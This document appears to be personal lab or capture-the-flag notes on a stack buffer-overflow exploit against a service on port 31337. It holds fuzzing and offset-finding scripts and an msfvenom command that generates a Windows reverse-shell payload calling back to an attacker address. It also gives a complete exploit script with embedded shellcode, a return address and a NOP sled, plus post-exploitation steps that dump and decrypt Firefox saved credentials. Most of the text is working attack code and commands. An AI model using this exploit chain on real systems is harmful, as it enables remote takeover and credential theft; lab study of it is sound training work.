# Fuzzing 
- Normal fuzzing didn't work idk y so i used to following code to get it working - 
```python
#!/usr/bin/env python2
import socket

RHOST = "10.10.143.172"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*500
buf += "\n"

s.send(buf)
print "Sent: {0}".format(buf)
data = s.recv(1024)
print "Received: {0}".format(data)

```

---

# Finding Offset 
- To find the offset first create a pattern using - 
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500                      
```
- Copy and paste the output into "Payload" section and change the necessary stuff. The code for the full program - 
```python 
import socket#Change to your IP

ip = "192.168.198.134"

port = 31337

prefix = ""

offset = 0 

overflow = "A" * offset

return_addr = ""

padding = ""

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"


postfix = ""


buffer = prefix + overflow + return_addr + padding + payload + postfix


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

---
# Badchars - 
#### Same as [[Badchars]]

---
# Shellcode -
- Generate a payload first -
```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.198.129 lport=2222  EXITFUNC=thread -b '\x00\x0a' -f c
```
- Now copy paste this into "shellcode" - 
```python
#!/usr/bin/env python2
import socket

RHOST = "192.168.198.134"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

shellcode = ("\xb8\x6a\x13\x26\x35\xd9\xc3\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xa9\x17\xc4\xc0\xd1\xf0\x8a"
"\x2b\x29\x01\xeb\xa2\xcc\x30\x2b\xd0\x85\x63\x9b\x92\xcb\x8f"
"\x50\xf6\xff\x04\x14\xdf\xf0\xad\x93\x39\x3f\x2d\x8f\x7a\x5e"
"\xad\xd2\xae\x80\x8c\x1c\xa3\xc1\xc9\x41\x4e\x93\x82\x0e\xfd"
"\x03\xa6\x5b\x3e\xa8\xf4\x4a\x46\x4d\x4c\x6c\x67\xc0\xc6\x37"
"\xa7\xe3\x0b\x4c\xee\xfb\x48\x69\xb8\x70\xba\x05\x3b\x50\xf2"
"\xe6\x90\x9d\x3a\x15\xe8\xda\xfd\xc6\x9f\x12\xfe\x7b\x98\xe1"
"\x7c\xa0\x2d\xf1\x27\x23\x95\xdd\xd6\xe0\x40\x96\xd5\x4d\x06"
"\xf0\xf9\x50\xcb\x8b\x06\xd8\xea\x5b\x8f\x9a\xc8\x7f\xcb\x79"
"\x70\x26\xb1\x2c\x8d\x38\x1a\x90\x2b\x33\xb7\xc5\x41\x1e\xd0"
"\x2a\x68\xa0\x20\x25\xfb\xd3\x12\xea\x57\x7b\x1f\x63\x7e\x7c"
"\x60\x5e\xc6\x12\x9f\x61\x37\x3b\x64\x35\x67\x53\x4d\x36\xec"
"\xa3\x72\xe3\xa3\xf3\xdc\x5c\x04\xa3\x9c\x0c\xec\xa9\x12\x72"
"\x0c\xd2\xf8\x1b\xa7\x29\x6b\xe4\x90\xf7\xea\x8c\xe2\xf7\xe4"
"\xe2\x6a\x11\x9e\xea\x3a\x8a\x37\x92\x66\x40\xa9\x5b\xbd\x2d"
"\xe9\xd0\x32\xd2\xa4\x10\x3e\xc0\x51\xd1\x75\xba\xf4\xee\xa3"
"\xd2\x9b\x7d\x28\x22\xd5\x9d\xe7\x75\xb2\x50\xfe\x13\x2e\xca"
"\xa8\x01\xb3\x8a\x93\x81\x68\x6f\x1d\x08\xfc\xcb\x39\x1a\x38"
"\xd3\x05\x4e\x94\x82\xd3\x38\x52\x7d\x92\x92\x0c\xd2\x7c\x72"
"\xc8\x18\xbf\x04\xd5\x74\x49\xe8\x64\x21\x0c\x17\x48\xa5\x98"
"\x60\xb4\x55\x66\xbb\x7c\x75\x85\x69\x89\x1e\x10\xf8\x30\x43"
"\xa3\xd7\x77\x7a\x20\xdd\x07\x79\x38\x94\x02\xc5\xfe\x45\x7f"
"\x56\x6b\x69\x2c\x57\xbe")

buf = ""
buf += "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 16 + shellcode  
buf += "\n"

s.send(buf)
print "Sent"
```
- Run the exploit using `python reverseshell.py`

# Post-Exploitation - 
- Use the meterpreter exploit - post/multi/gather/firefox_creds and dump the creds
- Then go to the following site and git clone it https://github.com/unode/firefox_decrypt#usage
- rename all the dumped files to their respective names and move all of them to the folder where the firefox_decrypt.py is located and then just type : 
`firefox_decrypt .`
